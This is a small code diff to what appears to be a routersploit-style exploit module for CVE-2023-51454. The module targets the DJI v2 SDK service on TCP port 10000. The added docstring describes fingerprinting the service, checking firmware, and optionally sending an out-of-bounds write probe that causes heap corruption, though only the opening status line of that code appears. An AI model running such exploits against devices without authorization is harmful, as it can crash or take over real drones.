@@ -150,7 +150,12 @@ class Exploit(HTTPClient):
 
     def run(self) -> None:
         print_warning("[LEGAL] Authorized use only. Only test against devices you own or have permission to test.")
+        self._exploit()
 
+    def _exploit(self) -> None:
+        """E2E CVE-2023-51454: fingerprint DJI v2 SDK on TCP/10000,
+        assess firmware version, and optionally send OOB write crash
+        probe to trigger the heap corruption in the SDK handler."""
         # Stage 1: fingerprint
         print_status(f"[Stage 1] Probing DJI v2 SDK service on {self.target}:{self.port}")
         try:
